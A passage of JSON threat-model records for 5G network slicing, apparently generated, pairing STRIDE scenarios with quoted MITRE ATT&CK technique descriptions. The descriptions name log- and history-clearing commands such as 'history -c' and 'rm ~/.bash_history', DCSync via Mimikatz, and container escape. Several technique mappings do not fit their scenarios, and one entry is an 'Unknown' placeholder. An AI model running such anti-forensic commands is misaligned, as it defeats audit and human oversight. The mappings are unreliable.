            "Threat Type": "Repudiation",
            "Scenario": "An external attacker uses a compromised account to perform actions without leaving verifiable traces.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not adequately protected.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of encryption and access controls for log files."
                },
                {
                    "Assumption": "Account security is weak.",
                    "Role": "Network Administrator",
                    "Condition": "Basic or default credentials and lack of multi-factor authentication."
                },
                {
                    "Assumption": "Log monitoring and alerting are insufficient.",
                    "Role": "Security Operations",
                    "Condition": "Failure to implement robust monitoring solutions."
                }
            ],
            "Potential Impact": "Non-repudiation compromised, unauthorized actions undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "compromisedaccount",
                "audit"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An internal actor deletes or modifies audit logs to cover unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient segregation of duties.",
                    "Role": "System Administrator",
                    "Condition": "Administrators have broad access to sensitive logs."
                },
                {
                    "Assumption": "Log integrity checks are not performed.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of cryptographic integrity checks on logs."
                },
                {
                    "Assumption": "Logging mechanisms are not robust.",
                    "Role": "Developer",
                    "Condition": "Inadequate or incomplete logging practices."
                }
            ],
            "Potential Impact": "Unauthorized actions cannot be traced back to individuals, hindering investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logalteration",
                "insiderthreat",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Use of ephemeral instances makes it difficult to track historical activities.",
            "Assumptions": [
                {
                    "Assumption": "Ephemeral instances lack persistent identifiers.",
                    "Role": "Cloud Architect",
                    "Condition": "Design choice to not include persistent identifiers or tags."
                },
                {
                    "Assumption": "Not all activities are logged before the instance is terminated.",
                    "Role": "DevOps Engineer",
                    "Condition": "Logging configurations don't capture all transient activities."
                },
                {
                    "Assumption": "Log retention policies are short-term.",
                    "Role": "IT Policy Maker",
                    "Condition": "Policies favor quick pruning of logs to save space."
                }
            ],
            "Potential Impact": "Difficulty in tracking actions taken by ephemeral instances, affecting accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "ephemeral",
                "tracking",
                "logging"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data due to weak encryption on data at rest.",
            "Assumptions": [
                {
                    "Assumption": "Data encryption standards are inadequate.",
                    "Role": "Security Engineer",
                    "Condition": "Use of weak encryption algorithms."
                },
                {
                    "Assumption": "Encryption keys are poorly managed.",
                    "Role": "Key Manager",
                    "Condition": "Keys stored insecurely or transmitted in plaintext."
                },
                {
                    "Assumption": "Access controls are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Weak or misconfigured permissions on data storage."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, affecting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "informationdisclosure",
                "encryption",
                "dataatrest",
                "keymanagement"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage through exposed management interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Management interfaces are directly accessible from the internet.",
                    "Role": "Network Architect",
                    "Condition": "Failure to restrict access to management interfaces."
                },
                {
                    "Assumption": "Authentication mechanisms on interfaces are weak.",
                    "Role": "Security Engineer",
                    "Condition": "Weak or default credentials used for interface access."
                },
                {
                    "Assumption": "Access to management interfaces is not monitored.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient logging and monitoring of interface access."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and control over network slices.",
            "MITRE ATT&CK Keywords": [
                "informationdisclosure",
                "managementinterfaces",
                "exposed",
                "accesscontrol"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the virtualized environment to access data of other tenants.",
            "Assumptions": [
                {
                    "Assumption": "Multi-tenancy isolation is weak.",
                    "Role": "Cloud Architect",
                    "Condition": "Improperly implemented isolation mechanisms."
                },
                {
                    "Assumption": "Security patches are not applied promptly.",
                    "Role": "System Administrator",
                    "Condition": "Delayed deployment of security updates."
                },
                {
                    "Assumption": "Vulnerability exists in hypervisor or container platforms.",
                    "Role": "Security Researcher",
                    "Condition": "Unpatched vulnerabilities in virtualization software."
                }
            ],
            "Potential Impact": "Data confidentiality is breached, leading to leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "informationdisclosure",
                "multitenancy",
                "hypervisor",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Escape to Host",
                "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
                "id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665",
                "technique_id": "T1611"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attack overwhelms the orchestration and management components, preventing proper functioning.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration services lack rate limiting or throttling mechanisms.",
                    "Role": "Developer",
                    "Condition": "Failure to implement request rate limiting."
                },
                {
                    "Assumption": "Monitoring and scaling of orchestration services are not effective.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient monitoring and scaling policies."
                },
                {
                    "Assumption": "Attackers have knowledge of the orchestration services endpoints.",
                    "Role": "Security Intelligence Analyst",
                    "Condition": "Endpoint information is disclosed or discoverable."
                }
            ],
            "Potential Impact": "Orchestration services become unavailable, affecting overall network operation.",
            "MITRE ATT&CK Keywords": [
                "denialofservice",
                "orchestration",
                "overload",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Edge nodes are targeted with a flood attack, disrupting low-latency communications.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are inadequately protected against volumetric attacks.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of effective DDoS mitigation techniques."
                },
                {
                    "Assumption": "Network traffic monitoring is not comprehensive.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient monitoring of edge network traffic."
                },
                {
                    "Assumption": "Attackers have knowledge of edge node configurations and addresses.",
                    "Role": "Threat Intelligence Analyst",
                    "Condition": "Information leakage or reconnaissance by attackers."
                }
            ],
            "Potential Impact": "Disruption of latency-sensitive services, impacting service availability.",
            "MITRE ATT&CK Keywords": [
                "denialofservice",
                "floodattack",
                "edge",
                "latency"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Critical network functions are disabled through resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "Resource allocation policies are not robust.",
                    "Role": "Cloud Architect",
                    "Condition": "Lack of effective resource management."
                },
                {
                    "Assumption": "Monitoring tools are unable to detect resource exhaustion early.",
                    "Role": "Developer",
                    "Condition": "Insufficient or poorly configured monitoring."
                },
                {
                    "Assumption": "Network functions are vulnerable to resource-heavy requests.",
                    "Role": "Security Analyst",
                    "Condition": "Design flaws in network functions."
                }
            ],
            "Potential Impact": "Critical network services become unavailable, leading to partial or complete service outage.",
            "MITRE ATT&CK Keywords": [
                "denialofservice",
                "resourceexhaustion",
                "networkfunctions",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges within a network slice to gain control over more critical functions.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access controls are not properly enforced.",
                    "Role": "System Administrator",
                    "Condition": "Improper configuration of RBAC policies."
                },
                {
                    "Assumption": "Vulnerabilities in network slice software allow privilege escalation.",
                    "Role": "Security Researcher",
                    "Condition": "Unpatched software vulnerabilities."
                },
                {
                    "Assumption": "Segregation of duties is not adequately implemented.",
                    "Role": "IT Policy Maker",
                    "Condition": "Lack of enforcement of principle of least privilege."
                }
            ],
            "Potential Impact": "Unauthorized access to higher-level functions and data, compromising security.",
            "MITRE ATT&CK Keywords": [
                "elevationofprivilege",
                "networkslice",
                "privilegeescalation",
                "accesscontrol"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider exploits weak access controls to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Internal security policies are not robust.",
                    "Role": "IT Policy Maker",
                    "Condition": "Lack of comprehensive internal security policies."
                },
                {
                    "Assumption": "Access control mechanisms are misconfigured.",
                    "Role": "System Administrator",
                    "Condition": "Errors or gaps in access control settings."
                },
                {
                    "Assumption": "Monitoring and auditing of administrative access are inadequate.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient logging and review of admin actions."
                }
            ],
            "Potential Impact": "Compromise of administrative controls leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevationofprivilege",
                "insider",
                "adminaccess",
                "accesscontrol"
            ],
            "mitre_technique": {
                "name": "DCSync",
                "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
                "id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
                "technique_id": "T1003.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits an unpatched vulnerability in the hypervisor to gain control over the entire virtualized environment.",
            "Assumptions": [
                {
                    "Assumption": "Hypervisor software is not regularly updated.",
                    "Role": "System Administrator",
                    "Condition": "Delayed or missed security updates."
                },
                {
                    "Assumption": "There are known vulnerabilities within the hypervisor.",
                    "Role": "Security Researcher",
                    "Condition": "Documented vulnerabilities exist."
                },
                {
                    "Assumption": "Access to hypervisor management interfaces is inadequately secured.",
                    "Role": "Network Engineer",
                    "Condition": "Weak or misconfigured access controls."
                }
            ],
            "Potential Impact": "Complete control over the virtualized environment and potential compromise of all hosted services.",
            "MITRE ATT&CK Keywords": [
                "elevationofprivilege",
                "hypervisor",
                "virtualization",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate Network Function (NF) within the 5G core network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain access to the network segment where the NF operates",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "The network lacks strong mutual authentication",
                    "Role": "Network Administrator",
                    "Condition": "Weak authentication mechanisms"
                },
                {
                    "Assumption": "Certificates or credentials used by legitimate NFs are not sufficiently protected",
                    "Role": "Security Administrator",
                    "Condition": "Poor credential management"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, data integrity compromised, potential service disruption",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "credential access",
                "network injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user to gain access to network resources",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained user credentials, possibly via phishing",
                    "Role": "Attacker",
                    "Condition": "Credential theft"
                },
                {
                    "Assumption": "The system does not enforce multi-factor authentication",
                    "Role": "System Administrator",
                    "Condition": "Lack of multi-factor authentication"
                },
                {
                    "Assumption": "The network is internet-facing, allowing remote attempts",
                    "Role": "Network Administrator",
                    "Condition": "Public-facing endpoints"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential for data exfiltration",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "phishing",
                "remote access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker infiltrates the network and impersonates the NFVO to manipulate the orchestration of VNFs",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access close to the NFVO",
                    "Role": "Attacker",
                    "Condition": "Network proximity"
                },
                {
                    "Assumption": "Inadequate role-based access controls on NFVO functions",
                    "Role": "Security Administrator",
                    "Condition": "Loose access controls"
                },
                {
                    "Assumption": "Endpoint security is insufficient to detect malicious actors",
                    "Role": "Endpoint Security Administrator",
                    "Condition": "Poor endpoint detection"
                }
            ],
            "Potential Impact": "Manipulation and disruption of network slice management leading to service degradation",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "orchestration manipulation",
                "network injection",
                "network disruption"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability to alter the data being processed by a VNF",
            "Assumptions": [
                {
                    "Assumption": "The attacker has identified and exploited an existing vulnerability in the VNF",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation"
                },
                {
                    "Assumption": "The VNF does not have adequate integrity checks",
                    "Role": "Network Administrator",
                    "Condition": "Lack of integrity checks"
                },
                {
                    "Assumption": "Network monitoring does not detect tampering attempts",
                    "Role": "Security Administrator",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Corruption of data processed by the VNF, potentially leading to inaccurate results or service failure",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "exploitation",
                "network function"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies orchestration scripts to allocate resources inappropriately",
            "Assumptions": [
                {
                    "Assumption": "The insider has privileged access",
                    "Role": "Insider",
                    "Condition": "Privileged access"
                },
                {
                    "Assumption": "Insider activities are not properly logged or monitored",
                    "Role": "Security Administrator",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "The scripts are not adequately reviewed for integrity",
                    "Role": "System Administrator",
                    "Condition": "Lack of script review"
                }
            ],
            "Potential Impact": "Misallocation of network resources, leading to potential service disruption or degradation",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "resource manipulation",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
